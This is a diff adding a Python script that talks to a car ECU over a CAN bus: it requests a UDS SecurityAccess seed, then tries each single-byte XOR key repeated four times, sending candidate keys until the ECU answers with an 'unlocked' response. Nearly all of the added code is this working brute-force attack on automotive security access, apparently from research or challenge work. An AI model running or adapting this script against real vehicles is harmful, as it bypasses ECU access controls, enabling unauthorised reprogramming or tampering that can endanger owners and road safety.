@@ -237,3 +237,49 @@ class SessionKeeper:
         self.stop_event.set()
         if self.thread:
             self.thread.join()
+
+
+def singleByteTransform(source, byteLen):
+    ret = 0
+    for i in range(byteLen):
+        ret = (ret << 8) | source  # 비트 시프트 후 더하기
+    return ret
+
+
+
+
+
+############################### sa_ret[], res_01[] 등 인덱스 함수에 맞출 필요 있음 #########
+
+if __name__ == "__main__":
+    bus = setup_can_bus()
+    print("program starts")
+
+    send_can_message(bus, REQ_ID, "02 27 01 00 00 00 00 00")
+    print("requested seed for lv 1")
+    res_01 = receive_response_return_hex(bus, RES_ID, 200)
+    if res_01[3:5] == "67":
+        print("got seed successfully")
+        seed_str = res_01[9:]
+        print(f'seed : \"{seed_str}\"')
+
+        seed_byte = bytes.fromhex(seed_str.replace(" ", ""))
+        seed_int = int.from_bytes(seed_byte, byteorder='big')
+
+        for i in range(0x00, 0xFF):
+            cipher = singleByteTransform(i, 4)
+            
+            xor_ret = seed_int ^ cipher
+            
+            xor_ret_byte = xor_ret.to_bytes(4, byteorder='big')
+            xor_ret_hex = xor_ret_byte.hex(' ').upper()
+
+            send_can_message(bus, REQ_ID, f'07 27 02 {xor_ret_hex} 00')
+            sa_ret = receive_response_return_byte(bus, RES_ID, 200)
+            if sa_ret:
+                if sa_ret[1] == 0x67:
+                    print("SA lv 1 unlocked!!")
+                    data_byte = sa_ret[3:]
+                    data_hex = sa_ret.hex(' ').upper()
+                    print(data_hex)
+    
